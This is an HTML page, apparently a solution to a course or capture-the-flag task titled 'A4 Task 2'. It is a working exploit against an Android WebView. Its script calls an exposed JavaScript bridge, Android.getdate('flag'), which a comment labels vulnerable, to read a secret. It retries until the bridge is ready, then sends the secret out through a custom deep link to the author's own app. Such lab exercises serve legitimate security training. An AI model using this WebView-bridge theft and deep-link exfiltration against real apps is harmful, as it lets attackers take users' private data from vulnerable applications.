<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>A4 Task 2</title>
</head>
<body>
  <div id="flagOutput">TEST TEXT</div>

  <script>
    (function() {
      setTimeout(function(){
        try {
          // Retrieve the flag using the vulnerable JavaScript interface.
          var flagInfo = Android.getdate("flag");
          // Update the page for debugging purposes.
          var flagDiv = document.getElementById("flagOutput");
          if (flagDiv) {
            flagDiv.innerText = flagInfo;
          } else {
            document.write(flagInfo);
          }
          console.log("Flag from Android interface:", flagInfo);
          // Redirect to our solution app via a deep link, carrying the flag.
          window.location.href = "myapp://flag?value=" + encodeURIComponent(flagInfo);
        } catch (e) {
          console.error("Error executing Android.getdate:", e);
          // Retry after a short delay if the interface isnâ€™t ready.
          setTimeout(arguments.callee, 250);
        }
      }, 0);
    })();
  </script>
</body>
</html>
